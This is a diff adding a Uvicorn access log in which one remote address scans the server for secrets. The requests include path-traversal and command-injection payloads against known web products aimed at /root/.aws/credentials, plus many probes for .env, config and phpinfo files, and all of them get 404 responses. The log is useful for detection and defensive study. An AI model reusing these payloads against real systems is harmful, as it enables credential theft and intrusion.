@@ -1,0 +1,53 @@
+INFO:     Started server process [7048]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://127.0.0.1:10229 (Press CTRL+C to quit)
+INFO:     94.26.90.191:60782:0 - "GET / HTTP/1.1" 200 OK
+INFO:     94.26.90.191:60782:0 - "GET /api/v1/namespaces/default/secrets HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /login_up.php?success_redirect...2B%2Froot%2F.aws%2Fcredentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /pms?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000 HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /admin/config?cmd=cat+/root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /cacti/cmd_realtime.php?1+1&&cat+~/.aws/credentials+1+1+1 HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=file&target=l1_Ly4uLy4uLy4uLy4uLy4uLy4uLy4uL3Jvb3QvLmF3cy9jcmVkZW50aWFscw== HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /cacti/cmd_realtime.php?action=polldata&host_id=1&local_data_id=1;cat%20../../../../../../../root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /index.php?option=com_media&view=mediaList&tmpl=component&fieldid=filename&folder=../../../../../../../root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /index.php?file=../../../../../../../../root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /home/superset/.superset/superset_config.py HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /ajax_dashboard.php?widget=../../../../../../../../root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /remote/fgt_lang?lang=/../../../../../../../../root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /mgmt/shared/authn/login/~../~../~../~../root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /index.php/core/preview?file=../../../../../../../../root/.aws/credentials&x=100&y=100 HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /.env.local HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /.env.production HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /blog.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /wp-content/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /application/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /app/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /config/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /api/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /laravel/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /library/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /nextjs-app/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /node-api/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /vendor/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /backend/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /home/user/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /myproject/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /.envs/.production/.django HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /react-app/.env HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /react-app/.env.production HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /config/secrets.json HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /config/settings.json HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /config.yaml HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /config.yml HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /config.py HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /phpinfo HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     94.26.90.191:60782:0 - "GET /info.php HTTP/1.1" 404 Not Found
